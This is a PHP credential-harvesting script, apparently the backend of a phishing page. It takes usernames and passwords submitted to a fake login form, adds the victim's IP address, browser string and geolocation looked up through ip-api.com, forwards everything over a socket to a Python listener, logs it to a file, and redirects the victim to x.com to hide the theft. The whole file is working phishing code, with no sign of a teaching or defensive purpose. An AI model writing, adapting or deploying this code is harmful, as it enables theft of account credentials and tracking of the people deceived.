<?php
// Capture credentials only on POST request
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $platform = isset($_POST['platform']) ? htmlspecialchars($_POST['platform']) : "Unknown";
    $username = isset($_POST['username']) ? htmlspecialchars($_POST['username']) : "N/A";
    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : "N/A";

    // Capture additional user information
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Validate and fetch geolocation data
    $location = "Unknown";
    if (filter_var($ip_address, FILTER_VALIDATE_IP)) {
        try {
            $geo_data = json_decode(file_get_contents("http://ip-api.com/json/{$ip_address}"), true);
            if ($geo_data["status"] === "success") {
                $location = "{$geo_data['city']}, {$geo_data['country']}";
            }
        } catch (Exception $e) {
            error_log("Geolocation API error: " . $e->getMessage());
        }
    }

    // Prepare data for Python
    $data = json_encode([
        "username" => $username,
        "password" => $password,
        "device_info" => [
            "IP Address" => $ip_address,
            "Location"   => $location,
            "Browser"    => $user_agent,
            "Device Info" => $user_agent
        ]
    ]);

    // Send data to Python script
    $socket = @stream_socket_client("tcp://127.0.0.1:5000", $errno, $errstr, 5);
    if ($socket) {
        fwrite($socket, $data . "\n");
        fclose($socket);
    } else {
        error_log("Socket connection failed: $errstr ($errno)");
    }

    // Log captured data
    file_put_contents("../captured_log.txt", $data . "\n", FILE_APPEND);

    // Redirect user
    header("Location: https://www.x.com/");
    exit();
}
?>
